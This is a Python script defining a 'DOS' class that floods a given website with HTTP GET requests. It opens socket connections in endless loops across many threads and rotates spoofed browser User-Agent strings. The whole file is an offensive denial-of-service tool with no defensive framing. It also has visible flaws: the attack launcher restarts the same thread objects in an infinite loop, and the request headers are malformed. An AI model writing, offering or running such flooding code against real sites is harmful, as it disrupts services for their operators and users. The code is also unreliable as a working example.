import threading
import socket
import random, time
import os


class DOS:
    def __init__(self, site) -> None:
        self.t = [None] * 1000
        self.a = [None] * 1000

        self.Green = '\033[92m' 
        self.Blue = '\033[94m' 
        self.Grey =  '\033[0m'
        self.Red = '\033[31m'

        self.site = site
        
        self.agent = []
        self.agent.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
        self.agent.append('Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7')
        self.agent.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
        self.agent.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14')
        self.data = '''
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
                    Accept-Language: en-us,en;q=0.5
                    Accept-Encoding: gzip,deflate
                    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
                    Keep-Alive: 115
                    Connection: keep-alive
                    '''
        self.packet = str('GET / HTTP/1.1\nHost: ' + site + '\n User-Agent: ' + random.choice(self.agent) + '\n' + self.data).encode('utf-8')
    
    def dos(self):
        while True:
            try:
                s = socket.socket()
                s.connect((self.site, 80))
                s.sendto(self.packet, (self.site, 80))
                s.send(self.packet)
                print(self.Green + time.ctime() + 'send to ->' + self.site + self.Grey)
            except socket.error:
                print(self.Red + time.ctime() + 'send error!' + self.Grey)
                exit(1)
            except KeyboardInterrupt:
                os._exit(0)
    
    def dos2(self):
        while True:
            try:
                self.dos()
            except KeyboardInterrupt:
                os._exit(0)
    
    
    def start_attack(self):
        for i in range(100):
            self.t[i] = threading.Thread(target=self.dos)
            self.a[i] = threading.Thread(target=self.dos2)
        while True:
            self.t[i].start()
            self.a[i].start()